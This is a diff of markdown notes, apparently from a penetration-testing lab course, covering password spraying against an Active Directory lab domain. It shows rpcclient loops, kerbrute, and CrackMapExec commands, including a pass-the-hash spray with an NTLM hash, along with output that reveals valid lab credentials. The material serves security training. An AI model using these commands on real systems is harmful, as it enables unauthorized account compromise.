@@ -12,15 +12,13 @@ Once we’ve created a wordlist using one of the methods shown in the previous s
 
 #### Using a Bash one-liner for the Attack
 
-```
-        shellsession
+```shellsession
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
 Let's try this out against the target environment.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 
 Account Name: tjohnson, Authority Name: INLANEFREIGHT
@@ -31,8 +29,7 @@ We can also use `Kerbrute` for the same attack as discussed previously.
 
 #### Using Kerbrute for the Attack
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
     __             __               __     
@@ -54,8 +51,7 @@ There are multiple other methods for performing password spraying from Linux. An
 
 #### Using CrackMapExec & Filtering Logon Failures
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
@@ -65,8 +61,7 @@ After getting one (or more!) hits with our password spraying attack, we can then
 
 #### Validating the Credentials with CrackMapExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -87,8 +82,7 @@ Sometimes we may only retrieve the NTLM hash for the local administrator account
 
 #### Local Admin Spraying with CrackMapExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
 SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
